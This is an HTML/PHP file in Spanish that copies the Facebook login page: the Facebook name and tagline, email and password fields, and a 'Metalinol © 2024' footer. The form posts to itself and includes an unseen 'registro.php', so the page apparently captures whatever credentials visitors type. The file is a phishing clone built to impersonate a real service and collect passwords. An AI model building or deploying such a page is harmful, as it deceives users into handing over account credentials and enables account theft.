<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="estilo.css">
    <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
    <script src="https://unpkg.com/unlazy@0.11.3/dist/unlazy.with-hashing.iife.js" defer init></script>
    <script src="scripts.js" defer></script>
</head>
<body>
    <div class="flex flex-col items-center justify-center min-h-screen bg-background">
        <h1 class="text-4xl font-bold text-blue-600">Facebook</h1>
        <p class="text-center text-muted-foreground mb-4">
        Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
        </p>

        <form method="post">
            <div class="casillas">
            <input name="Correo" id="Correo" type="text" placeholder="Correo electrónico o número de teléfono"  class="input-field border border-zinc-300 rounded-lg"/>

            <input name="Contraseña" id="Contraseña"  type="password" placeholder="Contraseña" class="input-field border border-zinc-300 rounded-lg"/>

            <input name="inicio" id="inicio" type="submit" value="Iniciar sesión"  class="submit-button"/>

                <p class="text-center text-muted-foreground mt-2"><a href="#" class="text-blue-600 hover:underline">¿Olvidaste tu contraseña?</a></p>
                <button class="bg-green-500 text-white p-2 rounded-lg w-full mt-4 hover:bg-green-400" type="reset">Crear cuenta nueva</button>
            </div>
        </form>

        <p class="text-center text-muted-foreground mt-6">Crea una página para una celebridad, una marca o un negocio.</p>
        <div class="mt-8 text-center">
            <p class="text-muted-foreground">Español | English (US) | Português (Brasil) | Français (France) | Italiano | Deutsch</p>
            <p class="text-muted-foreground">Metalinol © 2024</p>
        </div>
    </div>
    <?php
    include("registro.php");
    ?>
</body>
</html>
